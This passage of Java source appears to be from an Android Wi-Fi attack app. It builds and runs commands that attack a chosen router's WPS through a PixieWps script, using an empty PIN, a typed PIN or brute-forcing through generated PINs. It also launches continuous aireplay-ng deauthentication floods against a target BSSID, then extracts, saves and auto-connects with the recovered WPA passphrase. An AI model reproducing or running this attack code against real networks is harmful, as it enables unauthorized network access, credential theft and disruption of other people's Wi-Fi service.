                        autoconnect.setOnClickListener(view -> core.connectWiFi2(network.getSsid(),network.getPsk()));
                        autoconnect.setVisibility(View.VISIBLE);
                    }else{
                        resulttext.setText("Pin not found!");
                        autoconnect.setVisibility(View.GONE);
                    }
                }

                @Override
                public void onNewLine(String line) {
                    if(core.getBoolean("hide")){
                        Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
                        if (m.find()){
                            line = line.replace(m.group(), Core.HIDDEN_MAC);
                        }


                    }
                    if (line.contains("Trying PIN")){
                        Matcher m = Pattern.compile("[0-9]+").matcher(line);
                        if (m.find()){
                            core.putString(network.getMac()+"_pin",m.group());
                        }
                    }
                    outputtext.append(line + "\n");
                    smoothScrool(outputtext);
                }
                @Override
                public void onEvent(String line) {

                }
            };
        }
        else if (type == 8){
            core.scale(wifiimg, 0.65F);
            core.scale(attack_progress, 1.0F);
            cancel.setText(android.R.string.cancel);
            outputtext.setText(context.getResources().getString(R.string.wifi_null_pin_running));
            outputtext.append("\n");
            smoothScrool(outputtext);
            new Thread(core::wpsDisableWifiIfEnabled, "wps-radio-off").start();
            String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface()
                    + core.wpsIfaceDownFlag() + " -N -b " + network.getMac();
            oneshot = new AdvancedProcess(activity, context, cmd, true) {
                @Override
                public void onFinished(ArrayList<String> outputList) {
                    restoreWpsInterface();
                    WiFINetwork back = issuccess(outputList);
                    outputcard.setVisibility(View.GONE);
                    resulttext.setVisibility(View.VISIBLE);
                    core.scale(wifiimg, 1.0F);
                    core.scale(attack_progress, 0.0F);
                    cancel.setText(android.R.string.ok);
                    if (back.getOK()) {
                        if (core.isStoreEnabled()) {
                            core.saveNetwork(network.getMac(), back.getPsk(), back.getPin(), network.ssid);
                        }
                        resulttext.setText(context.getResources().getString(R.string.piin) + back.getPin()
                                + "\n" + context.getResources().getString(R.string.pass) + back.getPsk());
                        autoconnect.setOnClickListener(view -> core.connectWiFi2(network.getSsid(), back.getPsk()));
                        autoconnect.setVisibility(View.VISIBLE);
                    } else if (Core.contains(outputList, "wps_locked")) {
                        resulttext.setText(R.string.wifi_wps_locked_result);
                        autoconnect.setVisibility(View.GONE);
                    } else if (Core.contains(outputList, "foreign_owner")) {
                        resulttext.setText(R.string.wifi_foreign_owner_result);
                        autoconnect.setVisibility(View.GONE);
                    } else {
                        resulttext.setText("This router does not accept an empty WPS PIN.");
                        autoconnect.setVisibility(View.GONE);
                    }
                }

                @Override
                public void onNewLine(String line) {
                    if (core.getBoolean("hide")) {
                        Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
                        if (m.find()) {
                            line = line.replace(m.group(), Core.HIDDEN_MAC);
                        }
                    }
                    outputtext.append(line + "\n");
                    smoothScrool(outputtext);
                }

                @Override
                public void onEvent(String line) {

                }
            };
        }
        else if (type == 5){
            final String[] pin = {""};
            core.scale(wifiimg,0.65F);
            core.scale(attack_progress,1.0F);
                final Dialog valuedialog = new Dialog(context);
                valuedialog.setContentView(R.layout.input_dialog);
                android.view.Window vWin = valuedialog.getWindow();
                if (vWin != null) {
                    vWin.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
                    vWin.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
                }
                TextView title = valuedialog.findViewById(R.id.title);
                TextInputEditText valueedit = valuedialog.findViewById(R.id.value);
            MaterialButton ok = valuedialog.findViewById(R.id.ok);
            MaterialButton dismiss = valuedialog.findViewById(R.id.cancel);
            dismiss.setOnClickListener(view12 -> valuedialog.dismiss());
                title.setText(R.string.enter_pin);
                ok.setOnClickListener(view -> {
                        pin[0] = Objects.requireNonNull(valueedit.getText()).toString();
                      if (pin[0].length() == 8){
                        valuedialog.dismiss();
                        core.scale(wifiimg,0.65F);
                        core.scale(attack_progress,1.0F);
                        cancel.setText(android.R.string.cancel);
                        outputtext.setText(context.getResources().getString(R.string.piin)+ pin[0]);
                        outputtext.append("Trying to connect...");
                        smoothScrool(outputtext);

                          core.wpsDisableWifiIfEnabled();
                          String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface() + core.wpsIfaceDownFlag() + " -p "+ pin[0] +" -b " + network.getMac();
                          oneshot = new AdvancedProcess(activity, context, cmd, true) {
                              @Override
                              public void onFinished(ArrayList<String> outputList) {
                                    restoreWpsInterface();
                                    WiFINetwork back = issuccess(outputList);
                                    outputcard.setVisibility(View.GONE);
                                    resulttext.setVisibility(View.VISIBLE);
                                    core.scale(wifiimg,1.0F);
                                    core.scale(attack_progress,0.0F);
                                    cancel.setText(android.R.string.ok);
                                    if (back.getOK()){
                                        if (core.isStoreEnabled()) {
                                            core.saveNetwork(network.getMac(),back.getPsk(),back.getPin(),network.ssid);
                                        }
                                        resulttext.setText(context.getResources().getString(R.string.piin)+ back.getPin()+"\n"+context.getResources().getString(R.string.pass) + back.getPsk());
                                        autoconnect.setOnClickListener(view -> core.connectWiFi2(network.getSsid(),back.getPsk()));
                                        autoconnect.setVisibility(View.VISIBLE);
                                    }else{
                                        resulttext.setText("Pin incorrect!");
                                        autoconnect.setVisibility(View.GONE);
                                    }
                              }

                              @Override
                              public void onNewLine(String line) {
                                  if(core.getBoolean("hide")){
                                  Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
                                  if (m.find()){
                                      line = line.replace(m.group(), Core.HIDDEN_MAC);
                                  }
                                  }
                                  outputtext.append(line + "\n");
                                  smoothScrool(outputtext);
                              }

                              @Override
                              public void onEvent(String line) {

                              }
                          };
                      }else{
                        valueedit.setError("Pin must be 8 digits!");
                      }

               });
                valuedialog.setOnDismissListener(dialogInterface -> {
                    if (pin[0].length() <8){
                        dialog.dismiss();
                    }
                });
                valuedialog.show();

        }
        else if (type == 6){
            core.scale(wifiimg,0.65F);
            core.scale(attack_progress,1.0F);
            cancel.setText(android.R.string.cancel);
            outputtext.setText("Trying to generate common pins...\n");
            ArrayList<String> pins = new ArrayList<>();
            Context app = context;
            String pinGenCmd = "python3 -c \"import sys; sys.path.insert(0,'/CORE/PixieWps'); "
                    + "from pixie import WPSpin; [print(p) for p in WPSpin().getList(sys.argv[1])]\" "
                    + network.getMac();
            new Thread(() -> {
                final ArrayList<String> outputList = core.customChrootCommand(pinGenCmd);
                if (dialogCanceled.get()) return;
                activity.runOnUiThread(() -> {
                    if (dialogCanceled.get()) return;
                    if (outputList.size() > 0){
                        Pattern p = Pattern.compile("[0-9]{8}");
                        for (String line : outputList){
                            Matcher m = p.matcher(line);
                            if (m.find()){
                                pins.add(m.group());
                            }
                        }
                    }

                    if (pins.isEmpty()){
                        outputtext.append("Pin generation failed — no pins produced for this BSSID.\n");
                        core.scale(wifiimg,1.0F);
                        core.scale(attack_progress,0.0F);
                        cancel.setText(android.R.string.ok);
                        return;
                    }

                    final int[] pin_count = {pins.size()};

                    String[] pins_list = new String[pins.size()+1];
                    for (int i = 1; i < pins.size()+1; i++){
                        pins_list[i] = pins.get(i-1);
                    }
                    pins_list[0] = "Test all";
                    AtomicBoolean selected = new AtomicBoolean(false);
                    new MaterialAlertDialogBuilder(app)
                            .setTitle("Select pin")
                            .setItems(pins_list, (dialogInterface, i) -> {
                                core.wpsDisableWifiIfEnabled();
                                selected.set(true);
                                if (i == 0){
                                    if (pins.size() > 0){
                                        outputtext.append("Generated "+ pin_count[0] +" pins\n"); AdvancedProcess temp = null;
                                        final WiFINetwork[] result = {null};
                                        brutepsk = new AdvancedThread(activity, app) {
                                            @Override
                                            public void onFinished() {
                                                restoreWpsInterface();
                                                core.scale(wifiimg,1.0F);
                                                core.scale(attack_progress,0.0F);
                                                cancel.setText(android.R.string.ok);
                                                outputcard.setVisibility(View.GONE);
                                                resulttext.setVisibility(View.VISIBLE);
                                                if (result[0] != null && result[0].getOK()){
                                                    if (core.isStoreEnabled()) {
                                                        core.saveNetwork(network.getMac(),result[0].getPsk(),result[0].getPin(),network.ssid);
                                                    }
                                                    resulttext.setText(context.getResources().getString(R.string.piin)+ result[0].getPin()+"\n"+context.getResources().getString(R.string.pass) + result[0].getPsk());
                                                    autoconnect.setOnClickListener(view -> core.connectWiFi2(network.getSsid(),network.getPsk()));
                                                    autoconnect.setVisibility(View.VISIBLE);}
                                                else {
                                                    resulttext.setText("Pin not found!");
                                                    autoconnect.setVisibility(View.GONE);
                                                }
                                            }

                                            @Override
                                            public void eventListener(String line) {
                                                outputtext.append(line+"\n");
                                                smoothScrool(outputtext);
                                            }

                                            @Override
                                            public void doOnBackground() {
                                                try {
                                                    Thread.sleep(4000);
                                                } catch (InterruptedException e) {
                                                    e.printStackTrace();
                                                }
                                                String scaninterface = core.getWPSInterface();
                                                for (String pin :pins){
                                                    if (canceled){
                                                        break;
                                                    }
                                                    pin_count[0]--;
                                                    sendEvent("Trying pin "+pin+" Left: "+ pin_count[0]);
                                                    String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + scaninterface + core.wpsIfaceDownFlag() + " -p "+pin+" -b " + network.getMac();
                                                    final ArrayList<String> pinOutput = new ArrayList<>();
                                                    brutepin = new AdvancedProcess(activity, app, cmd, true) {
                                                        @Override
                                                        public void onFinished(ArrayList<String> lines) {
                                                        }

                                                        @Override
                                                        public void onNewLine(String line) {
                                                            pinOutput.add(line);
                                                            sendEvent(line);
                                                        }

                                                        @Override
                                                        public void onEvent(String line) {
                                                        }
                                                    };
                                                    while (brutepin.isRunning() && !canceled){
                                                        try {
                                                            Thread.sleep(500);
                                                        } catch (InterruptedException e) {
                                                            break;
                                                        }
                                                    }
                                                    if (canceled){
                                                        brutepin.kill();
                                                        break;
                                                    }
                                                    result[0] = issuccess(pinOutput);
                                                    if (result[0].getOK()){
                                                        break;
                                                    }
                                                }
                                            }

                                            @Override
                                            public void onCanceled() {

                                            }
                                        };



                                    }
                                }else{
                                    core.scale(wifiimg,0.65F);
                                    core.scale(attack_progress,1.0F);
                                    cancel.setText(android.R.string.cancel);
                                    outputtext.setText(context.getResources().getString(R.string.piin)+ pins.get(i-1));
                                    outputtext.append("Trying to connect... with pin "+pins.get(i-1)+"\n");
                                    smoothScrool(outputtext);

                                    String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface() + core.wpsIfaceDownFlag() + " -p "+ pins.get(i-1) +" -b " + network.getMac();
                                    oneshot = new AdvancedProcess(activity, context, cmd, true) {
                                        @Override
                                        public void onFinished(ArrayList<String> outputList) {
                                            restoreWpsInterface();
                                            WiFINetwork back = issuccess(outputList);
                                            outputcard.setVisibility(View.GONE);
                                            resulttext.setVisibility(View.VISIBLE);
                                            core.scale(wifiimg,1.0F);
                                            core.scale(attack_progress,0.0F);
                                            cancel.setText(android.R.string.ok);
                                            if (back.getOK()){
                                                if (core.isStoreEnabled()) {
                                                    core.saveNetwork(network.getMac(),back.getPsk(),back.getPin(),network.ssid);
                                                }
                                                resulttext.setText(context.getResources().getString(R.string.piin)+ back.getPin()+"\n"+context.getResources().getString(R.string.pass) + back.getPsk());
                                                autoconnect.setOnClickListener(view -> core.connectWiFi2(network.getSsid(),network.getPsk()));
                                                autoconnect.setVisibility(View.VISIBLE);
                                            }else{
                                                resulttext.setText("Pin incorrect!");
                                                autoconnect.setVisibility(View.GONE);
                                            }
                                        }

                                        @Override
                                        public void onNewLine(String line) {
                                            if(core.getBoolean("hide")){
                                                Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
                                                if (m.find()){
                                                    line = line.replace(m.group(), Core.HIDDEN_MAC);
                                                }
                                            }
                                            outputtext.append(line + "\n");
                                            smoothScrool(outputtext);
                                        }

                                        @Override
                                        public void onEvent(String line) {

                                        }
                                    };
                                }
                            }).setOnDismissListener(dialog1 -> {
                                if (!selected.get()){
                                    dialog.dismiss();
                                }
                            })
                            .show();
                });
            }).start();


        }
        else if (type == 7){
            new Thread(() -> {
            if (dialogCanceled.get()) return;
            String deauthIface = core.getDeauthInterface();
            boolean ok = false;
            if (core.isRootless() || !MonitorManager.isInternalRadio(deauthIface)
                    || core.isInternalDeauthEnabled()){
                ok = core.enableMonitorMode(deauthIface, String.valueOf(network.getChannel()));
            }else{
                activity.runOnUiThread(() -> outputtext.append("Internal wifi adapter (wlan0) deauth is disabled! Enable 'Deauth with internal adapter' in Settings, or use an external wifi adapter!\n"));
            }
            if (dialogCanceled.get()) return;
            final String monIface = core.getDeauthInterface();
            if (ok) {
                 deauther = new AdvancedProcess(activity, context, "aireplay-ng --ignore-negative-one -0 0 -a  " + network.getMac() + " " + monIface, true) {
                    @Override
                    public void onFinished(ArrayList<String> outputList) {

                    }

                    @Override
                    public void onNewLine(String line) {
                        if(core.getBoolean("hide")){
                            Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
                            if (m.find()){
                                line = line.replace(m.group(), Core.HIDDEN_MAC);
                            }
                        }
                        outputtext.append(line + "\n");
                        smoothScrool(outputtext);
                        if (line.contains("available")) {
                            outputtext.append("Deauth failed! Your wifi card does not support deauthing!\n");
                        }
                    }

                    @Override
                    public void onEvent(String line) {

                    }
                };
                if (dialogCanceled.get() && deauther != null) {
                    deauther.kill();
                }
            }else{
                activity.runOnUiThread(() ->
                        outputtext.append(context.getString(R.string.wifi_monitor_failed, monIface) + "\n"));
            }
            }).start();
        }
    }







    public void restoreWpsInterface() {
        new Thread(() -> {
            if (core.isRootless()) {
                String wpsIface = core.getWPSInterface();
                if (wpsIface != null && wpsIface.length() > 0) {
                    core.customChrootCommand("ifconfig " + wpsIface + " up", true);
                }
                String hsIface = core.getHSInterface();
                if (hsIface != null && hsIface.length() > 0 && !hsIface.equals(wpsIface)) {
                    core.customChrootCommand("ifconfig " + hsIface + " up", true);
                }
                return;
            }
            String wpsIface = core.getWPSInterface();
            if (wpsIface != null && wpsIface.length() > 0) {
                core.customCommand("ifconfig " + wpsIface + " up", true);
            }
            String hsIface = core.getHSInterface();
            if (hsIface != null && hsIface.length() > 0 && !hsIface.equals(wpsIface)) {
                core.customCommand("ifconfig " + hsIface + " up", true);
            }
            if (core.isPixieIfaceDown()) {
                core.customCommand("svc wifi enable", true);
            }
        }).start();
    }

    public WiFINetwork issuccess(ArrayList<String> out) {
        String pin;
        String pass;

        WiFINetwork back = new WiFINetwork();
        for (int i = 0; i < out.size(); i++) {
            String s = out.get(i);
            if (s.contains("[+] WPS PIN:")) {
                pin = s.replace("[+] WPS PIN: ", "").replaceAll("'", "");
                back.setPin(pin);
                back.setOK(true);
            } else if (s.contains("[+] WPA PSK:")) {
                pass = s.replace("[+] WPA PSK: ", "").replaceAll("'", "");
                back.setPsk(pass);
                back.setOK(true);
            }
        }
        if (out.isEmpty()) {
            back.setCanceled(true);
        }
        return back;
    }


    public boolean checkIsSsidConnected(String ssid){
        if (core.isRootless()) {
            try {
                android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
                        context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                if (wm != null) {
                    android.net.wifi.WifiInfo info = wm.getConnectionInfo();
                    if (info != null && info.getSSID() != null) {
                        return info.getSSID().replace("\"", "").equals(ssid);
                    }
                }
            } catch (Exception ignored) {
            }
            return false;
        }
        String line;
        boolean result = false;
        try {

            Process process = Runtime.getRuntime().exec("su -mm");
            OutputStream stdin = process.getOutputStream();
            InputStream stderr = process.getErrorStream();
            InputStream stdout = process.getInputStream();
            stdin.write(("dumpsys netstats | grep wlan" + '\n').getBytes());
            stdin.write(("\n").getBytes());
            stdin.flush();
            stdin.close();
            BufferedReader br = new BufferedReader(new InputStreamReader(stdout));
            while ((line = br.readLine()) != null) {
                if (line.contains(ssid)) {
                    result = true;
                }
            }
            br.close();
            process.waitFor();
            process.destroy();
        } catch (IOException e) {
        } catch (InterruptedException ex) {
        }

        return result;
    }
    @RequiresApi(api = Build.VERSION_CODES.O)
    public void createBruteNotification(String key, int prog, int max) {
        Intent intent = new Intent(core.getContext(), MainActivity.class);
        PendingIntent contentIntent = PendingIntent.getActivity(core.getContext(), 0, intent, Utils.setPendingIntentFlag());
        String CHANNEL_ID = "BruteForce PSK";
        NotificationChannel notificationChannel = new NotificationChannel(CHANNEL_ID, "BruteForce PSK", NotificationManager.IMPORTANCE_LOW);

        NotificationCompat.Builder b = new NotificationCompat.Builder(core.getContext());

        b.setAutoCancel(true)
                .setDefaults(Notification.DEFAULT_ALL)
                .setWhen(System.currentTimeMillis())
                .setSmallIcon(R.drawable.bolt)
                .setTicker("Brute")
                .setContentTitle(key)
                .setChannelId(CHANNEL_ID)
                .setDefaults(Notification.DEFAULT_LIGHTS | Notification.DEFAULT_SOUND)
                .setContentIntent(contentIntent)
                .setProgress(max, prog, false)
                .setContentInfo("Info");


        NotificationManager notificationManager = (NotificationManager) core.getContext().getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.createNotificationChannel(notificationChannel);
        notificationManager.notify(5, b.build());
    }
    public void toaster(String msg) {
        activity.runOnUiThread(() -> {
            Toast toast = Toast.makeText(context,
                    msg, Toast.LENGTH_SHORT);
            toast.show();
        });

    }

    public void settext(String text, TextView output) {
        activity.runOnUiThread(() -> output.setText(text));
    }

    @Override
    public long getItemId(int position) {
        return position;
    }

    public void changeitem(WiFINetwork temp, int pos) {
        activity.runOnUiThread(() -> {
            wifilist.set(pos, temp);
            notifyItemChanged(pos);

        });
    }

    @Override
    public int getItemViewType(int position) {
        return position;
    }
    public WiFINetwork pixie(ArrayList<String> out) {
        String pin;
        String pass;

        WiFINetwork back = new WiFINetwork();
        for (int i = 0; i < out.size(); i++) {
            String s = out.get(i);
            if (s.contains("[+] WPS pin:")) {
                pin = s.replace("[+] WPS pin: ", "").replaceAll("'", "");
                back.setPin(pin);
                back.setOK(true);
            }if (s.contains("[+] WPS PIN:")) {
                pin = s.replace("[+] WPS PIN: ", "").replaceAll("'", "");
                back.setPin(pin);
                back.setOK(true);
            }
            if (s.contains("[+] WPA PSK:")) {
                pass = s.replace("[+] WPA PSK: ", "").replaceAll("'", "");
                back.setPsk(pass);
                back.setOK(true);
            }
        }
        return back;
    }

    public static class ViewHolder extends RecyclerView.ViewHolder {
        public TextView wifi_name;
        public TextView wifi_mac;
        public TextView wifi_model;
        public TextView wifi_power;
        public TextView wps_mark;
        public TextView five_mark;
        public TextView pixie_mark;
        public TextView lock_mark;
        public TextView key_mark;
        public TextView iswps;
        public View card;
        public ImageView icon;
        public View divider;


        public ViewHolder(View v) {
            super(v);
            wifi_name = v.findViewById(R.id.wifi_name);
            wifi_mac = v.findViewById(R.id.wifi_bssid);
            wifi_model = v.findViewById(R.id.wifi_model);
            wifi_power = v.findViewById(R.id.wifi_power);
            iswps = v.findViewById(R.id.iswps);
            card = v.findViewById(R.id.item);
            icon = v.findViewById(R.id.icon_wifi);
            wps_mark = v.findViewById(R.id.wps_mark);
            five_mark = v.findViewById(R.id.five_mark);
            pixie_mark = v.findViewById(R.id.pixie_mark);
            lock_mark = v.findViewById(R.id.lock_mark);
            key_mark = v.findViewById(R.id.key_mark);
            divider = v.findViewById(R.id.wifi_item_divider);
        }

    }

}
